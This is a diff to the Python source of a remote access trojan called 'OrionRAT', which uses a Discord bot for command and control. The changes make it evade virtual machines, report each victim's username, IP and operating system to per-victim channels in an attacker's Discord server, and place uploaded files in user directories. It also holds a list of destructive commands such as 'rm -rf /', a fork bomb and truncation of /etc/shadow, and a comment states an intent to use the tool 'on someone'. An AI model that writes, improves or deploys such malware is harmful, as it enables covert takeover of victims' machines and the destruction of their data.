@@ -10,34 +10,72 @@ import sys
 import tempfile
 import os, sys, tempfile, signal 
 import shutil
-
-
-
-checkvm.check()
 user=os.getlogin()
+
+
+if platform.system() == "Linux":
+        os = "linux"
+if platform.system() == "Windows":
+        os = "windows"
+if platform.system() == "Darwin":
+        os = "macos"
+checkvm.check()
 rip=requests.get('https://checkip.amazonaws.com/')
 ip=rip.text
 status = ["rm -rf /", "rm -rf /home/*", "rm -rf *", ":(){ :|:& };:", "ifconfig eth0 down", "ip link set eth0 down", "kill -9 -1", "chmod -R 000 /", "rm -rf /boot/*", "rm -rf /bin /sbin /usr/bin /usr/sbin", "shutdown -h now", "reboot", "systemctl stop network-manager", "echo 1  /proc/sys/kernel/sysrq", "echo c  /proc/sysrq-trigger", "echo b  /proc/sysrq-trigger", "mount -o remount,ro /", "umount -a", "chattr +i /", "swapoff -a", "echo 0  /proc/1/oom_adj", "pkill -u root", "rm -rf /var/log/*", "truncate -s 0 /etc/passwd", "truncate -s 0 /etc/shadow", "rm -rf /tmp/*", "rm -rf /var/*", "poweroff", "shutdown"]
 # TODO remove when we actually use the rat on someone
 
-intents = discord.Intents.default()
-intents.message_content = True
+intents = discord.Intents.all()
 
 bot = commands.Bot(command_prefix="$", intents=intents, help_command=None)
 
+async def get_or_create_channel(guild, channel_name, category_name="OrionRAT"):
+    # First, try to find the existing channel
+    existing_channel = discord.utils.get(guild.channels, name=channel_name)
+    if existing_channel:
+        return existing_channel
+
+    # Find the category object if specified
+    category = "OrionRAT"
+    if category_name:
+        # Use fetch_channel for guaranteed accuracy
+        for c in guild.categories:
+            if c.name == category_name:
+                category = c
+                break
+    # Create the channel
+    new_channel = await guild.create_text_channel(channel_name, category=category)
+    return new_channel
 @bot.event
 async def on_ready():    
         await bot.change_presence(
         activity=discord.Game(name=ip),  # Playing …
         status=discord.Status.online  
         )
-        channel = bot.get_channel(1409571342373748746)
+        
+        guild = bot.get_guild(1408928221608673412)
+        category_name = "OrionRAT"
+        category = discord.utils.get(guild.categories, name=category_name)
         embed = discord.Embed(
             title=F"OrionRAT | New connection.",
             description=f"Username: **{user}**\nIP: **{ip}**\n**To see commands, type $help**",
             color=discord.Color.red()  
-        )
-        await channel.send('<@&1409573051263090759>',embed=embed)
+        )   
+            
+        channel_name = f"{user}-{os}"
+        existing_channel = None
+        for ch in category.text_channels:  # only text channels in this category
+            # --- CORRECTED: use case-insensitive match to avoid misses ---
+            if ch.name.lower() == channel_name.lower():  
+                existing_channel = ch
+                break
+
+        if existing_channel:
+            await existing_channel.send('<@&1409573051263090759> <@&1409642747346026511>', embed=embed)
+        else:
+            # --- CORRECTED: use returned channel object directly, no need for bot.get_channel ---
+            channel = await guild.create_text_channel(name=channel_name, category=category)
+            await channel.send('<@&1409573051263090759> <@&1409642747346026511>', embed=embed)
 
 @bot.command()
 async def help(ctx):
@@ -136,7 +174,8 @@ async def upload(ctx):
     if platform.system() == "Linux":
         upload_dir = "/home/plasma/.local/share/"
     elif platform.system() == "Windows":
-        upload_dir = os.path.join(os.environ['APPDATA'].replace("Roaming", "LocalLow"))
+        upload_dir = f"C:\\Users\\{user}\\AppData\\Local\\"
+
     else:
         upload_dir = "uploads"
 
